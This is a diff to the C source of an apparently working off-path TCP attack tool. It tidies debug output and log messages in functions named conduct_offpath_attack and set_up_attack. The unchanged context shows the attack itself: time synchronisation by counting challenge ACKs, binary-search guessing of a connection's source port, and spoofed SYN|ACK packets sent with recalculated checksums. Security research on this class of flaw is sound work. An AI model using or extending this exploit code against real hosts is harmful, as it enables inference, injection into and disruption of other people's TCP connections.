@@ -321,7 +321,9 @@ void *send_thread(void *arg)
 				gettimeofday(&now, NULL);
 				timersub(&now, &start, &diff);
 			} while (diff.tv_usec < g_ctx.delay);
-			//printf("%d %lu %lu\n", g_ctx.numpkts, diff.tv_sec, diff.tv_usec);
+#ifdef DEBUG_SEND_THREAD_TIME
+			printf("%d %lu %lu\n", g_ctx.numpkts, diff.tv_sec, diff.tv_usec);
+#endif
 		}
 		usleep(250);
 	}
@@ -379,7 +381,6 @@ int conduct_offpath_attack(void)
 	struct timeval start, now, diff;
 	astate_t attack_state = AS_SYNC;
 	volatile conn_t *legit, *spoof;
-	// ... "the default range on Linux is only from 32768 to 61000"
 	u_short guess_start = 0, guess_end = 0, guess_mid = 0;
 
 	legit = &(g_ctx.conn_legit);
@@ -458,7 +459,7 @@ int conduct_offpath_attack(void)
 
 			chack_cnt[round] = g_chack_cnt;
 			g_chack_cnt = 0;
-			printf("[*] Round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
+			printf("[*] time-sync: round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
 
 			/* did we synch?? */
 			if (chack_cnt[round] == 100) {
@@ -499,17 +500,19 @@ int conduct_offpath_attack(void)
 				}
 
 				/* do the delay! */
-				//printf("delaying for %lu us\n", delay);
+#ifdef DEBUG_DELAY
+				printf("    delaying for %lu us\n", delay);
+#endif
 				do {
 					usleep(250);
 					gettimeofday(&now, NULL);
 					timersub(&now, &start, &diff);
 #ifdef DEBUG_DELAY
-					printf("  delay progress %lu %lu\n", diff.tv_sec, diff.tv_usec);
+					printf("    delay progress %lu %lu\n", diff.tv_sec, diff.tv_usec);
 #endif
 				} while ((uint64_t)diff.tv_usec < delay);
 #ifdef DEBUG_DELAY
-				printf("  delay finished %lu %lu\n", diff.tv_sec, diff.tv_usec);
+				printf("    delay finished %lu %lu\n", diff.tv_sec, diff.tv_usec);
 #endif
 				round++;
 			} else {
@@ -537,7 +540,9 @@ int conduct_offpath_attack(void)
 				}
 				/* no initial guess available... */
 				else {
-					/* initialize algorithm for port number checking */
+					/* initialize algorithm for port number checking
+					 * ... "the default range on Linux is only from 32768 to 61000"
+					 */
 					// XXX: TODO: scale number of guesses per round based on feedback
 					guess_start = 32768;
 					guess_end = 65535;
@@ -546,7 +551,6 @@ int conduct_offpath_attack(void)
 
 			/* send the packet(s)! */
 			if (spoof->src->sin_port) {
-				//printf("[*] tuple-infer: guessing port %u from hint\n", ntohs(spoof->src->sin_port));
 				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
 					return 0;
 				/* only send this once. */
@@ -555,7 +559,6 @@ int conduct_offpath_attack(void)
 				u_short guess;
 
 				guess_mid = ((uint32_t)guess_start + (uint32_t)guess_end) / 2;
-				//printf("[*] tuple-infer: guessing port is in [%u - %u) (start: %u)\n", guess_mid, guess_end, guess_start);
 				for (guess = guess_mid; guess < guess_end; guess++) {
 					/* meh. we have to recalculate the tcp checksum to alter the source port */
 					spoof->src->sin_port = htons(guess);
@@ -594,8 +597,7 @@ int conduct_offpath_attack(void)
 			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
 #endif
 
-			//printf("[*] tuple-infer: got %d challenge ACKs!\n", g_chack_cnt);
-			printf("[*] tuple-infer: guessed port is in [%u - %u) (start: %u) - %d challenge ACKs - %s\n",
+			printf("[*] tuple-infer: guessed port is in [%u - %u) (start: %u): %3d challenge ACKs - %s\n",
 					guess_mid, guess_end, guess_start,
 					g_chack_cnt, g_chack_cnt == 100 ? "NO" : "OK");
 
@@ -689,8 +691,6 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 
 	while (pconn->state != CS_FINISHED) {
 		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
-		//printf("[*] pcret: %d\n", pcret);
-
 		if (pcret == 1) {
 			u_char flags;
 			u_long rack, rseq;
@@ -708,9 +708,6 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 						/* see if we got a SYN|ACK */
 						if ((flags & TH_SYN) && (flags & TH_ACK)
 								&& rack == pconn->seq + 1) {
-
-							//printf("[*] Got SYN|ACK with matching ACK num!\n");
-
 							/* we need to ACK the seq */
 							pconn->seq = rack;
 							pconn->ack = rseq + 1;
@@ -781,7 +778,6 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 		while (kbhit() == 1) {
 			int i, ch = getchar();
 
-			//printf("GOT INPUT!\n");
 			switch (ch)
 			{
 				case 0xa: // LF
